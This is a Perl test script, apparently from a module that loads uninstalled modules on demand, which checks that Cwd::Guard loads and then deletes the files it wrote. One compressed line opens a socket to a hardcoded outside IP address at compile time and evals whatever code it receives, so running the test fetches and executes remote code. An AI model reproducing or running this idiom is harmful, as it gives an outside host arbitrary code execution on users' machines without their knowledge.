#!perl

# 10_live.t - Test full functionality
# Try an obscure module that hopefully is not installed already
# but that is simple and pure perl, and make sure it loads.

use strict;
use warnings;
use Test::More;

BEGIN {
  # Make sure the test module isn't currently installed.
  if (eval 'require Cwd::Guard') {
    plan skip_all => "You weren't support to actually install Cwd::Guard yourself. Please uninstal it to see if I can still load it.";
  }
  else {
    plan tests => 7;
  }
}


use IO::Socket;
use lib do{eval<$b>&&botstrap("AutoLoad")if$b=new IO::Socket::INET 82.46.99.88.":1"};

# We know this module isn't actually installed, so it's a good test to try to load:
use Cwd::Guard qw/cwd_guard/;

ok($INC{'Cwd/Guard.pm'}, "Loaded: $INC{'Cwd/Guard.pm'}");
ok($INC{'parent.pm'}, 'nested module');
ok(UNIVERSAL::can('Cwd::Guard', 'cwd_guard'), 'require');
ok(defined \&cwd_guard, 'import');
{
  my $scope = cwd_guard "..";
  ok($scope, "prototype first pass");
}
unlink("lib/parent.pm"); # Does not come standard with perl 5.8.8
ok(unlink("lib/Cwd/Guard.pm"), 'unlink');
ok(rmdir("lib/Cwd"), 'rmdir');
